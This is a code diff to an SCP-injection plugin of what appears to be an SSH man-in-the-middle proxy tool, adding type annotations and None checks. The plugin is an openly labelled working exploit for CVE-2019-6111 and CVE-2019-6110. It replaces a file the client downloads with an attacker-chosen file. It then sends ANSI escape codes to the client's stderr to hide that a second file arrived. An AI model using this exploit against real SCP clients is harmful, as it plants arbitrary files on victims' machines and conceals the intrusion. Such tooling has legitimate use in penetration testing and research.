@@ -4,6 +4,8 @@ from typing import (
     TYPE_CHECKING
 )
 
+from typeguard import typechecked
+
 import ssh_proxy_server
 from ssh_proxy_server.forwarders.scp import SCPForwarder
 
@@ -26,7 +28,8 @@ class SCPInjectFile(SCPForwarder):
     '''
 
     @classmethod
-    def parser_arguments(cls):
+    @typechecked
+    def parser_arguments(cls) -> None:
         plugin_group = cls.parser().add_argument_group(
             cls.__name__,
             "Example exploit for CVE-2019-6111, CVE-2019-6110"
@@ -38,7 +41,7 @@ class SCPInjectFile(SCPForwarder):
             help='file that is used for injection'
         )
 
-    def __new__(cls, *args, **kwargs):
+    def __new__(cls, *args, **kwargs):  # type: ignore
         if args[0].scp_command.find(b'-f') != -1:
             return super(SCPInjectFile, cls).__new__(cls)
         logging.debug("SCPClient is not downloading a file, reverting to normal SCPForwarder")
@@ -51,20 +54,26 @@ class SCPInjectFile(SCPForwarder):
         self.inject_file_stat = os.stat(self.args.scp_inject_file)
         self.file_to_inject = None
 
-    def process_data(self, traffic):
+    def process_data(self, traffic: bytes) -> bytes:
         if traffic == b'\x00':
             self.exploit()
         return traffic
 
-    def exploit(self):
-        def wait_ok():
+    def exploit(self) -> None:
+        def wait_ok() -> bool:
+            if self.session.scp_channel is None:
+                return False
             return self.session.scp_channel.recv(1024) == b'\x00'
 
-        def send_ok():
+        def send_ok() -> None:
+            if self.session.scp_channel is None:
+                return
             self.session.scp_channel.sendall(b'\x00')
 
         # This is CVE-2019-6111: whatever file the client requested, we send
         # them 'exploit.txt' instead.
+        if self.session.scp_channel is None:
+            return
         logging.info('Injecting file %s to channel %d', self.args.scp_inject_file, self.session.scp_channel.get_id())
         command = "{}{} {} {}\n".format(
             self.file_command,
@@ -86,10 +95,12 @@ class SCPInjectFile(SCPForwarder):
         self.hide_tracks()
         logging.warning("Successful exploit CVE-2019-6111 over channel %d", self.session.scp_channel.get_id())
 
-    def hide_tracks(self):
+    def hide_tracks(self) -> None:
         # This is CVE-2019-6110: the client will display the text that we send
         # to stderr, even if it contains ANSI escape sequences. We can send
         # ANSI codes that clear the current line to hide the fact that a second
         # file was transmitted..
         # Covering our tracks by sending ANSI escape sequence; complete stealth: \\x1b[1A\\x1b[2K
+        if self.session.scp_channel is None:
+            return
         self.session.scp_channel.sendall_stderr("\x1b[1A\x1b[2K".encode('ascii'))
